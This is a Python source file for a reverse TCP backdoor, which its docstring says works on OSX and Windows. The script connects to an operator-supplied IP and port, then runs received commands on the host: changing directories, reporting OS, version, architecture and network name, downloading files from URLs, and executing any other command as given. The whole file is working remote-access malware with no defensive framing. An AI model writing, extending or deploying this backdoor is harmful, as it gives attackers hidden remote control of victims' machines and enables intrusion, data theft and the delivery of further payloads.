import socket
import os
import platform
import utils


"""
Reverse TCP backdoor works on OSX and Windows
"""

def main():
    args = utils.init_argparse('TCP Reverse Shell')
    port = args.port
    ip = args.ip

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip, port))
        
        while True:
            cmd = s.recv(1024).decode('utf-8').rstrip('\n')

            if cmd.strip() == 'exit':
                s.sendall(b'[+] Terminating remote session.')
                break

            out = handle_cmd(cmd)
            s.sendall(out.encode('utf-8'))
    

def handle_cmd(cmd):
    keyword = cmd.split(' ')[0]

    # change directories
    if keyword == 'cd':
        dir = cmd.split('cd')[1].strip()

        try:
            os.chdir(dir)
            return os.getcwd()
        except FileNotFoundError:
            return '{dir} does not exist.'.format(dir=dir)

    # get system information
    if keyword == 'sys_info':
        return sys_info()

    # download a file
    if keyword == 'download':
        url = cmd.split('download')[1].strip()
        try:
            fname = utils.download(url)
            return 'Sucessfully downloaded and saved to {fname}.'.format(fname=fname)
        except:
            return 'Unable to fetch ' + url

    # upload a file

    # execute the command as is

    # get an interactive shell

    # help
    else:
        return utils.execute_cmd(cmd)


def sys_info():
    info = ('OS: {os}'
            '\nVersion: {version}'
            '\nArchitecture: {arch}'
            '\nNetwork Name: {name}\n'
            ).format(os=platform.system(), 
            version=platform.version(), 
            arch=platform.machine(), 
            name=platform.node())

    return info


if __name__ == '__main__':
    main()